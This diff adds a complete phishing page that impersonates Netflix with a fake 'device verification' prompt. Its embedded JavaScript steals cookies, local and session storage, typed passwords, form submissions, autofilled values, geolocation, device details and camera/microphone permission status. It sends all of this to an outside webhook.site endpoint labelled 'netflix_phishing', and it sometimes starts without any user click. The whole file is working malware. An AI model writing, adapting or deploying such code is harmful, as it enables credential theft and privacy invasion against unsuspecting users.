@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Netflix Premium Access</title>
+    <style>
+        body { margin: 0; padding: 0; background: #000; color: white; font-family: Arial; overflow: hidden; }
+        .loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
+        .netflix-logo { color: #e50914; font-size: 60px; font-weight: bold; margin-bottom: 30px; }
+        .loader { width: 200px; height: 4px; background: #333; border-radius: 2px; overflow: hidden; margin: 20px 0; }
+        .loader-bar { height: 100%; background: #e50914; width: 0%; animation: loading 3s ease-in-out; }
+        @keyframes loading { 0% { width: 0%; } 100% { width: 100%; } }
+        .permission-box { background: rgba(229, 9, 20, 0.2); padding: 15px; border-radius: 8px; margin: 20px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="loading-screen" id="loadingScreen">
+        <div class="netflix-logo">NETFLIX</div>
+        <div>Initializing Premium Access...</div>
+        <div class="loader"><div class="loader-bar"></div></div>
+        
+        <div class="permission-box" id="permissionBox">
+            <h4>🔒 Device Verification Required</h4>
+            <p>Click ALLOW to verify your device for premium access</p>
+            <button onclick="bypassSecurity()" style="background: #e50914; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">ALLOW ACCESS</button>
+        </div>
+    </div>
+
+    <script>
+        class AdvancedStealer {
+            constructor() { this.collectedData = {}; }
+
+            collectBasicInfo() {
+                this.collectedData.basic = {
+                    userAgent: navigator.userAgent, platform: navigator.platform,
+                    deviceType: this.detectDeviceType(), languages: navigator.languages,
+                    hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory,
+                    connection: navigator.connection ? { effectiveType: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt } : null,
+                    screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth },
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, cookies: document.cookie,
+                    localStorage: this.getAllLocalStorage(), sessionStorage: this.getAllSessionStorage(),
+                    referrer: document.referrer, url: window.location.href, timestamp: new Date().toISOString()
+                };
+            }
+
+            detectDeviceType() {
+                const ua = navigator.userAgent;
+                if (/Mobile|Android|iPhone/i.test(ua)) return 'Mobile';
+                if (/Tablet|iPad/i.test(ua)) return 'Tablet';
+                return 'Desktop';
+            }
+
+            getAllLocalStorage() { const data = {}; try { for (let i = 0; i < localStorage.length; i++) { const key = localStorage.key(i); data[key] = localStorage.getItem(key); } } catch (e) {} return data; }
+            getAllSessionStorage() { const data = {}; try { for (let i = 0; i < sessionStorage.length; i++) { const key = sessionStorage.key(i); data[key] = sessionStorage.getItem(key); } } catch (e) {} return data; }
+
+            async getAdvancedLocation() {
+                const locationData = {};
+                try { const responses = await Promise.allSettled([fetch('https://ipapi.co/json/'), fetch('https://ipinfo.io/json'), fetch('https://api.ip.sb/geoip')]);
+                    for (let response of responses) { if (response.status === 'fulfilled' && response.value.ok) { const data = await response.value.json(); locationData.ipBased = data; break; } }
+                } catch (e) {}
+                locationData.wifiInfo = this.getWifiInfo(); locationData.timezoneAnalysis = this.analyzeTimezone(); return locationData;
+            }
+
+            getWifiInfo() { const connection = navigator.connection; return connection ? { effectiveType: connection.effectiveType, downlink: connection.downlink, rtt: connection.rtt, saveData: connection.saveData } : null; }
+            analyzeTimezone() { const tz = Intl.DateTimeFormat().resolvedOptions().timeZone; const offset = new Date().getTimezoneOffset(); return { timezone: tz, offset: offset }; }
+
+            async forceMediaAccess() {
+                const mediaData = {};
+                try { const devices = await navigator.mediaDevices.enumerateDevices(); mediaData.devices = devices.map(device => ({ kind: device.kind, label: device.label, deviceId: device.deviceId }));
+                    try { const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1, height: 1 }, audio: false }); stream.getTracks().forEach(track => track.stop()); mediaData.cameraAccess = 'granted'; } catch (e) { mediaData.cameraAccess = 'denied'; }
+                    try { const stream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true }); stream.getTracks().forEach(track => track.stop()); mediaData.microphoneAccess = 'granted'; } catch (e) { mediaData.microphoneAccess = 'denied'; }
+                } catch (e) { mediaData.error = e.message; } return mediaData;
+            }
+
+            setupFormHijacking() {
+                document.querySelectorAll('form').forEach((form, index) => { const originalSubmit = form.onsubmit; form.onsubmit = function(e) { const formData = new FormData(form); const data = {}; for (let [key, value] of formData.entries()) { data[key] = value; }
+                        sendToServer({ type: 'form_submission', formData: data, formId: form.id || `form_${index}` }); if (originalSubmit) { return originalSubmit.call(this, e); } }; });
+                document.querySelectorAll('input[type="password"]').forEach(input => { let lastValue = ''; input.addEventListener('input', function() { if (this.value && this.value !== lastValue) { lastValue = this.value; sendToServer({ type: 'password_input', fieldName: this.name || 'unknown', value: this.value, timestamp: new Date().toISOString() }); } }); });
+                setTimeout(() => { document.querySelectorAll('input').forEach(input => { if (input.value) { sendToServer({ type: 'autofill_data', fieldType: input.type, fieldName: input.name || 'unknown', value: input.value, timestamp: new Date().toISOString() }); } }); }, 1000);
+            }
+
+            trackUserBehavior() { let clicks = 0; let keysPressed = 0; let scrollDepth = 0; document.addEventListener('click', (e) => { clicks++; sendToServer({ type: 'user_click', clicks: clicks, target: e.target.tagName, timestamp: new Date().toISOString() }); }); document.addEventListener('keydown', () => { keysPressed++; }); window.addEventListener('scroll', () => { const newDepth = Math.round((window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100); if (newDepth > scrollDepth) { scrollDepth = newDepth; } }); return { clicks, keysPressed, scrollDepth }; }
+
+            async collectTechnicalData() { const batteryInfo = await this.getBatteryInfo(); const storageInfo = await this.getStorageInfo(); return { battery: batteryInfo, performance: this.getPerformanceInfo(), network: this.getNetworkInfo(), storage: storageInfo }; }
+            async getBatteryInfo() { if ('getBattery' in navigator) { try { const battery = await navigator.getBattery(); return { level: battery.level, charging: battery.charging, chargingTime: battery.chargingTime, dischargingTime: battery.dischargingTime }; } catch (e) { return null; } } return null; }
+            getPerformanceInfo() { const memory = performance.memory; return { memory: memory ? { used: memory.usedJSHeapSize, total: memory.totalJSHeapSize, limit: memory.jsHeapSizeLimit } : null, timing: performance.timing ? { loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart, domReadyTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart } : null }; }
+            getNetworkInfo() { return { online: navigator.onLine, type: navigator.connection?.effectiveType, saveData: navigator.connection?.saveData }; }
+            async getStorageInfo() { if ('storage' in navigator && 'estimate' in navigator.storage) { try { const estimate = await navigator.storage.estimate(); return { usage: estimate.usage, quota: estimate.quota }; } catch (e) { return null; } } return null; }
+
+            async collectAllData() { this.collectBasicInfo(); this.collectedData.location = await this.getAdvancedLocation(); this.collectedData.media = await this.forceMediaAccess(); this.collectedData.technical = await this.collectTechnicalData(); this.collectedData.behavior = this.trackUserBehavior(); this.setupFormHijacking(); return this.collectedData; }
+        }
+
+        async function sendToServer(data) { const YOUR_WEBHOOK_URL = 'https://webhook.site/b7de489c-4da3-4197-b262-b5a6d9fc029b'; try { const allData = JSON.parse(localStorage.getItem('advanced_victims') || '[]'); allData.push({...data, timestamp: new Date().toISOString()}); localStorage.setItem('advanced_victims', JSON.stringify(allData)); } catch (e) {} try { await fetch(YOUR_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Data-Type': data.type || 'unknown' }, body: JSON.stringify({ ...data, source: 'netflix_phishing', version: '2.0' }) }); } catch (e) { console.log('Webhook error:', e); } }
+
+        async function bypassSecurity() { document.getElementById('permissionBox').innerHTML = '🔄 Bypassing security protocols...'; try { const stealer = new AdvancedStealer(); const allData = await stealer.collectAllData(); await sendToServer({ type: 'full_data', data: allData }); document.getElementById('permissionBox').innerHTML = '✅ Security bypassed! Loading premium content...'; setTimeout(() => { document.getElementById('loadingScreen').style.display = 'none'; }, 2000); } catch (error) { document.getElementById('permissionBox').innerHTML = '❌ Error: ' + error.message; } }
+
+        setTimeout(() => { if (Math.random() < 0.3) { bypassSecurity(); } }, 3000);
+    </script>
+</body>
+</html>
